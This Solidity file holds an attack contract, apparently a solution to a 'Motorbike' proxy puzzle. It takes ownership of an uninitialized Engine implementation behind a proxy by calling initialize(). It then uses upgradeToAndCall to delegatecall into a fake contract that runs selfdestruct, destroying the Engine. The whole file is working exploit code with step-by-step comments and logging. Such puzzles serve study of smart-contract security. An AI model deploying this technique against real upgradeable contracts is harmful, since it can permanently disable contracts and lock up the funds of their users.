// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

import "hardhat/console.sol";

contract Hacker {
  address public hacker;

  modifier onlyHacker() {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /**
   * @custom:hacker copy of Motorbike's AddressSlot
   */
  struct AddressSlot {
    address value;
  }

  AddressSlot public implementationSlot; // slot No.1 (No.0 is hacker address)

  function attack(bytes32 _targetSlotValue) public onlyHacker {
    /// @dev 1. Simulate AddressSlot, decode the address of the Engine contract.
    assembly {
      // store the target slot value into the simulated implementation slot.
      sstore(1, _targetSlotValue)
    }
    // now implementationSlot.value has the target address
    console.log("decoded Engine address %s", implementationSlot.value);
    address engine = implementationSlot.value;

    /// @dev 2. Engine implementation has been initialized by Proxy, however Engine contract itself has not been initialized.
    /// Take the ownership of Engine.
    // solhint-disable-next-line avoid-low-level-calls
    (bool success, ) = engine.call(abi.encodeWithSignature("initialize()"));
    require(success, "Hacker: engine initialize failed");
    console.log("initialize() was successful");

    /// @dev 3. Create a fake engine implementation
    address fakeEngineImpl = address(new FakeEngine());
    console.log("fake Engine address %s", fakeEngineImpl);

    /// @dev 4. Now hacker has been authorized to call upgradeToAndCall of Engine.
    /// Upgrade Engine to the fake one, and call destory.
    // upgradeToAndCall uses delegatecall, thus destorySelf will destory Engine.
    bytes memory destoryCallData = abi.encodeWithSignature("destorySelf()");
    // solhint-disable-next-line avoid-low-level-calls
    (success, ) = engine.call(
      abi.encodeWithSignature(
        "upgradeToAndCall(address,bytes)",
        fakeEngineImpl,
        destoryCallData
      )
    );
    require(success, "Hacker: upgrade failed");
    console.log("upgradeToAndCall() was successful");

    /// @dev 5. Validate
    /// @NOTE extcodesize is still non-zero in the current transaction chain.
    // uint256 codeSize;
    // assembly {
    //   codeSize := extcodesize(engine)
    // }
    // require(codeSize == 0, "Hacker: code size not zero");
  }
}

/**
 * @custom:hacker The fake engine contract used to destory the current engine.
 */
contract FakeEngine {
  /**
   * @custom:hacker destory self, will be called via delegatecall from the current engine contract.
   */
  function destorySelf() external {
    console.log("destorySelf has been called from %s", msg.sender);
    selfdestruct(payable(msg.sender));
  }
}
